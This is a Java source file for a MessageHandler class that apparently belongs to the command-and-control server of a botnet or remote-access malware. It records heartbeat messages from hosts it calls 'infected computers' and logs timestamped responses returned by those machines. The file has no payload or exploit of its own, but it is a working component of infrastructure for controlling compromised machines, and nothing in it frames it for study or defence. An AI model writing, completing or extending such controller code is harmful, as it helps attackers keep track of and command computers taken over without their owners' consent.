package communication;

import java.net.InetAddress;
import controller.Database;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;

public class MessageHandler implements Runnable {
	String msg;
	CommunicationProtocol type;
	InetAddress address;
	@Override
	public void run() {
		if(type==CommunicationProtocol.IMALIVE) {
			Database.addInfectedComputer(address, Integer.parseInt(msg));
		}
		else if(type==CommunicationProtocol.RESPONSE) {
			String to_add= "[" + DateTimeFormatter.ofPattern("dd/MM/yyyy - hh:mm").format(ZonedDateTime.now())+ "]: " +msg;
			Database.addResponse(address, to_add);
		}
	}
	
	public MessageHandler(String msg, CommunicationProtocol type, InetAddress addr) {
		super();
		this.msg = msg;
		this.type = type;
		this.address= addr;
	}

}
